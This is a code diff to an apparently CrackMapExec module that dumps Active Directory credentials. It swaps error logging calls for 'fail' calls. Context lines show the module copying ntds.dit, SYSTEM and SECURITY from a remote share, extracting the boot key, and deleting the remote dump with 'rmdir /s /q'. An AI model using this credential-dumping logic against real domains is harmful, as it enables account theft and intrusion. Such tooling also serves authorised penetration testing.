@@ -48,7 +48,7 @@ class CMEModule:
         if 'success' in p:
             context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
         else:
-            context.log.error("Error while dumping NTDS")
+            context.log.fail("Error while dumping NTDS")
             return
 
         os.makedirs(self.dir_result, exist_ok=True)
@@ -62,7 +62,7 @@ class CMEModule:
                 connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'Active Directory\\ntds.dit', dump_file.write)
                 context.log.debug('Copied ntds.dit file')
             except Exception as e:
-                context.log.error('Error while get ntds.dit file: {}'.format(e))
+                context.log.fail('Error while get ntds.dit file: {}'.format(e))
 
         context.log.debug('Copy SYSTEM to host')
         with open(os.path.join(self.dir_result,'registry','SYSTEM'), 'wb+') as dump_file:
@@ -70,7 +70,7 @@ class CMEModule:
                 connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'registry\\SYSTEM', dump_file.write)
                 context.log.debug('Copied SYSTEM file')
             except Exception as e:
-                context.log.error('Error while get SYSTEM file: {}'.format(e))
+                context.log.fail('Error while get SYSTEM file: {}'.format(e))
 
         context.log.debug('Copy SECURITY to host')
         with open(os.path.join(self.dir_result,'registry','SECURITY'), 'wb+') as dump_file:
@@ -78,14 +78,14 @@ class CMEModule:
                 connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'registry\\SECURITY', dump_file.write)
                 context.log.debug('Copied SECURITY file')
             except Exception as e:
-                context.log.error('Error while get SECURITY file: {}'.format(e))
+                context.log.fail('Error while get SECURITY file: {}'.format(e))
         context.log.display("NTDS dump copied to %s" % self.dir_result)
         try:
             command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
             p = connection.execute(command, True)
             context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))
         except Exception as e:
-            context.log.error('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))
+            context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))
 
         localOperations = LocalOperations("%s/registry/SYSTEM" % self.dir_result)
         bootKey = localOperations.getBootKey()
@@ -137,7 +137,7 @@ class CMEModule:
             context.log.display("To extract only enabled accounts from the output file, run the following command: ")
             context.log.display("grep -iv disabled {} | cut -d ':' -f1".format(connection.output_filename + '.ntds'))
         except Exception as e:
-            context.log.error(e)
+            context.log.fail(e)
 
         NTDS.finish()
         
